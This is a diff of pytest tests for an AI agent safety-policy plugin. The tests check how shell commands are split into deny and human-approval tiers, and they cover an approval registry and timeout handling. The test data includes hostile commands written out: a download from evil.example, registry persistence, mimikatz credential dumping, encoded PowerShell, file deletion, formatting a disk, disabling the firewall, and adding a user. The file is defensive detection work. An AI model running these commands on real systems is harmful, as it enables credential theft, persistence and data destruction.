@@ -109,6 +109,77 @@ def test_classify_command_builtin_categories_checked_before_custom():
 
 
 # ------------------------------------------------------------------
+# policy.classify_command / classify_source_code - approval tier
+# ------------------------------------------------------------------
+
+@pytest.mark.parametrize(
+    "category,command",
+    [
+        ("downloader", "curl http://evil.example/x -o x.exe"),
+        ("persistence", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x"),
+        ("credential_access", "mimikatz.exe sekurlsa::logonpasswords"),
+        ("obfuscation", "powershell -enc SQBFAFgA"),
+        ("destructive_delete", r"del C:\Users\jp\AppData\Roaming\secrets.txt"),
+        ("disk_and_reboot", "format C: /y"),
+    ],
+)
+def test_classify_command_default_tier_is_deny_for_high_confidence_categories(category, command):
+    decision = policy.classify_command(command)
+
+    assert decision.tier == "deny"
+
+
+@pytest.mark.parametrize(
+    "category,command",
+    [
+        ("firewall_and_defender", "netsh advfirewall set allprofiles state off"),
+        ("privilege_escalation", "runas /user:Administrator cmd.exe"),
+        ("account_changes", "net user hacker Password123 /add"),
+    ],
+)
+def test_classify_command_default_tier_is_approve_for_context_dependent_categories(category, command):
+    decision = policy.classify_command(command)
+
+    assert decision.tier == "approve"
+
+
+def test_classify_command_approval_categories_override_default():
+    # persistence is deny-tier by default; explicitly adding it to
+    # approval_categories should flip it to approve-tier.
+    decision = policy.classify_command(
+        "reg add HKLM\\Software\\Evil", approval_categories={"persistence"}
+    )
+
+    assert decision.category == "persistence"
+    assert decision.tier == "approve"
+
+
+def test_classify_command_empty_approval_categories_makes_everything_deny():
+    decision = policy.classify_command("net user hacker /add", approval_categories=set())
+
+    assert decision.category == "account_changes"
+    assert decision.tier == "deny"
+
+
+def test_classify_command_allowed_decision_tier_is_irrelevant_default():
+    decision = policy.classify_command("dotnet build")
+
+    assert decision.allowed is True
+    assert decision.tier == "deny"  # dataclass default, unused when allowed
+
+
+def test_classify_command_custom_pattern_match_is_always_deny_tier():
+    decision = policy.classify_command(
+        "Get-Secret -Name x",
+        custom_patterns=["get-secret"],
+        approval_categories=policy._APPROVAL_TIER_DEFAULT_CATEGORIES,
+    )
+
+    assert decision.category == "custom"
+    assert decision.tier == "deny"
+
+
+# ------------------------------------------------------------------
 # policy.classify_source_code - python/nodejs shell-out detection
 # ------------------------------------------------------------------
 
@@ -129,6 +200,19 @@ def test_classify_source_code_denies_shellout_variants(language: str, code: str)
     decision = policy.classify_source_code(code)
 
     assert decision.allowed is False, f"expected {language} to be denied: {code!r}"
+
+
+def test_classify_source_code_list_args_match_is_always_deny_tier():
+    """The shell_out_list_args category isn't in the approval-tier default
+    set and has no per-category config key - it's the least precise
+    detection path, so it stays deny-only regardless of approval_categories."""
+    decision = policy.classify_source_code(
+        "subprocess.run(['reg', 'add', 'HKLM\\\\x'])",
+        approval_categories=policy._APPROVAL_TIER_DEFAULT_CATEGORIES | {"shell_out_list_args"},
+    )
+
+    assert decision.category == "shell_out_list_args"
+    assert decision.tier == "deny"
 
 
 @pytest.mark.parametrize(
@@ -214,15 +298,79 @@ def test_append_denial_appends_multiple_lines(monkeypatch, tmp_path):
 
 
 # ------------------------------------------------------------------
+# approval_registry
+# ------------------------------------------------------------------
+
+from plugins._safety_policy.helpers import approval_registry
+
+
+@pytest.mark.asyncio
+async def test_approval_registry_register_and_resolve():
+    future = approval_registry.register("approval-1")
+
+    resolved = approval_registry.resolve("approval-1", True)
+
+    assert resolved is True
+    assert await future is True
+
+
+@pytest.mark.asyncio
+async def test_approval_registry_resolve_false():
+    future = approval_registry.register("approval-2")
+
+    approval_registry.resolve("approval-2", False)
+
+    assert await future is False
+
+
+def test_approval_registry_resolve_unknown_id_returns_false():
+    assert approval_registry.resolve("no-such-id", True) is False
+
+
+@pytest.mark.asyncio
+async def test_approval_registry_double_resolve_is_noop():
+    approval_registry.register("approval-3")
+
+    first = approval_registry.resolve("approval-3", True)
+    second = approval_registry.resolve("approval-3", False)
+
+    assert first is True
+    assert second is False  # already popped by the first resolve
+
+
+@pytest.mark.asyncio
+async def test_approval_registry_cleanup_makes_later_resolve_a_noop():
+    approval_registry.register("approval-4")
+
+    approval_registry.cleanup("approval-4")
+
+    assert approval_registry.resolve("approval-4", True) is False
+
+
+# ------------------------------------------------------------------
 # _05_command_policy.py extension - end-to-end
 # ------------------------------------------------------------------
+
+class _FakeLogItem:
+    def __init__(self, kvps):
+        self.kvps = dict(kvps or {})
+        self.update_calls = []
+
+    def update(self, **kwargs):
+        self.update_calls.append(kwargs)
+        self.kvps.update(kwargs)
+
 
 class _FakeLog:
     def __init__(self):
         self.entries = []
+        self.items = []
 
     def log(self, **kwargs):
         self.entries.append(kwargs)
+        item = _FakeLogItem(kwargs.get("kvps"))
+        self.items.append(item)
+        return item
 
 
 class _FakeContext:
@@ -249,11 +397,26 @@ class _FakeAgent:
         self.config = _FakeAgentConfig()
 
 
-def _patch_config(monkeypatch, module, *, enforce_policy: bool, custom_patterns=None):
+def _patch_config(
+    monkeypatch,
+    module,
+    *,
+    enforce_policy: bool,
+    custom_patterns=None,
+    approval_categories=None,
+    approval_timeout_seconds: int = 300,
+):
     monkeypatch.setattr(
         module,
         "get_config",
-        lambda agent: {"enforce_policy": enforce_policy, "custom_deny_patterns": custom_patterns or []},
+        lambda agent: {
+            "enforce_policy": enforce_policy,
+            "custom_deny_patterns": custom_patterns or [],
+            "approval_tier_categories": (
+                policy._APPROVAL_TIER_DEFAULT_CATEGORIES if approval_categories is None else approval_categories
+            ),
+            "approval_timeout_seconds": approval_timeout_seconds,
+        },
     )
 
 
@@ -438,6 +601,154 @@ async def test_extension_respects_custom_deny_patterns(monkeypatch):
             tool_name="code_execution_tool",
             tool_args={"runtime": "terminal", "code": "Get-Secret -Name prod-db-password"},
         )
+
+
+# ------------------------------------------------------------------
+# _05_command_policy.py extension - approve-tier flow
+# ------------------------------------------------------------------
+
+import uuid as uuid_module
+
+_APPROVE_TIER_COMMAND = "net user hacker Password123 /add"  # account_changes
+
+
+def _fix_uuid(monkeypatch, module, value: int):
+    fixed = uuid_module.UUID(int=value)
+    monkeypatch.setattr(module.uuid, "uuid4", lambda: fixed)
+    return str(fixed)
+
+
+@pytest.mark.asyncio
+async def test_extension_approve_tier_proceeds_when_approved(monkeypatch):
+    import plugins._safety_policy.extensions.python.tool_execute_before._05_command_policy as module
+
+    _patch_config(monkeypatch, module, enforce_policy=True)
+    approval_id = _fix_uuid(monkeypatch, module, 1)
+    agent = _FakeAgent()
+    ext = SafetyCommandPolicy(agent=agent)
+
+    async def _approve_shortly():
+        await asyncio.sleep(0.05)
+        assert approval_registry.resolve(approval_id, True) is True
+
+    # Must not raise - an approved decision lets the tool call proceed.
+    await asyncio.gather(
+        ext.execute(
+            tool_name="code_execution_tool",
+            tool_args={"runtime": "terminal", "code": _APPROVE_TIER_COMMAND},
+        ),
+        _approve_shortly(),
+    )
+
+    item = agent.context.log.items[-1]
+    assert item.kvps["resolved"] is True
+    assert item.kvps["outcome"] == "approved"
+
+
+@pytest.mark.asyncio
+async def test_extension_approve_tier_raises_when_denied(monkeypatch):
+    import plugins._safety_policy.extensions.python.tool_execute_before._05_command_policy as module
+
+    _patch_config(monkeypatch, module, enforce_policy=True)
+    approval_id = _fix_uuid(monkeypatch, module, 2)
+    agent = _FakeAgent()
+    ext = SafetyCommandPolicy(agent=agent)
+
+    async def _deny_shortly():
+        await asyncio.sleep(0.05)
+        approval_registry.resolve(approval_id, False)
+
+    async def _run():
+        with pytest.raises(RepairableException):
+            await ext.execute(
+                tool_name="code_execution_tool",
+                tool_args={"runtime": "terminal", "code": _APPROVE_TIER_COMMAND},
+            )
+
+    await asyncio.gather(_run(), _deny_shortly())
+
+    item = agent.context.log.items[-1]
+    assert item.kvps["resolved"] is True
+    assert item.kvps["outcome"] == "denied"
+
+
+@pytest.mark.asyncio
+async def test_extension_approve_tier_times_out_and_cleans_up_registry(monkeypatch):
+    import plugins._safety_policy.extensions.python.tool_execute_before._05_command_policy as module
+
+    _patch_config(monkeypatch, module, enforce_policy=True, approval_timeout_seconds=0.05)
+    approval_id = _fix_uuid(monkeypatch, module, 3)
+    agent = _FakeAgent()
+    ext = SafetyCommandPolicy(agent=agent)
+
+    with pytest.raises(RepairableException, match="within"):
+        await ext.execute(
+            tool_name="code_execution_tool",
+            tool_args={"runtime": "terminal", "code": _APPROVE_TIER_COMMAND},
+        )
+
+    item = agent.context.log.items[-1]
+    assert item.kvps["resolved"] is True
+    assert item.kvps["outcome"] == "timeout"
+    # cleanup() ran - a late resolve for the same id is a guaranteed no-op.
+    assert approval_registry.resolve(approval_id, True) is False
+
+
+@pytest.mark.asyncio
+async def test_extension_approval_log_item_retains_original_fields_after_resolution(monkeypatch):
+    """Regression test: LogItem.update(kvps={...}) REPLACES the whole kvps
+    dict rather than merging it (see helpers/log.py's _update_item) - the
+    finish-approval step must pass resolved/outcome as **kwargs instead so
+    the original approval_id/category/matched_text/command/runtime the
+    frontend needs to keep rendering stay intact."""
+    import plugins._safety_policy.extensions.python.tool_execute_before._05_command_policy as module
+
+    _patch_config(monkeypatch, module, enforce_policy=True)
+    approval_id = _fix_uuid(monkeypatch, module, 4)
+    agent = _FakeAgent()
+    ext = SafetyCommandPolicy(agent=agent)
+
+    async def _approve_shortly():
+        await asyncio.sleep(0.05)
+        approval_registry.resolve(approval_id, True)
+
+    await asyncio.gather(
+        ext.execute(
+            tool_name="code_execution_tool",
+            tool_args={"runtime": "terminal", "code": _APPROVE_TIER_COMMAND},
+        ),
+        _approve_shortly(),
+    )
+
+    item = agent.context.log.items[-1]
+    assert item.kvps["category"] == "account_changes"
+    assert item.kvps["approval_id"] == approval_id
+    assert item.kvps["command"] == _APPROVE_TIER_COMMAND
+    assert item.kvps["resolved"] is True
+    assert item.kvps["outcome"] == "approved"
+
+
+@pytest.mark.asyncio
+async def test_extension_deny_tier_category_never_goes_through_approval_path(monkeypatch):
+    """A hard-deny category (e.g. disk_and_reboot) must raise immediately -
+    no approval_request log message, no registry entry."""
+    import plugins._safety_policy.extensions.python.tool_execute_before._05_command_policy as module
+
+    _patch_config(monkeypatch, module, enforce_policy=True)
+    agent = _FakeAgent()
+    ext = SafetyCommandPolicy(agent=agent)
+
+    with pytest.raises(RepairableException):
+        await asyncio.wait_for(
+            ext.execute(
+                tool_name="code_execution_tool",
+                tool_args={"runtime": "terminal", "code": "shutdown /r /t 0"},
+            ),
+            timeout=1,
+        )
+
+    assert len(agent.context.log.entries) == 1
+    assert agent.context.log.entries[0]["type"] == "warning"
 
 
 # ------------------------------------------------------------------
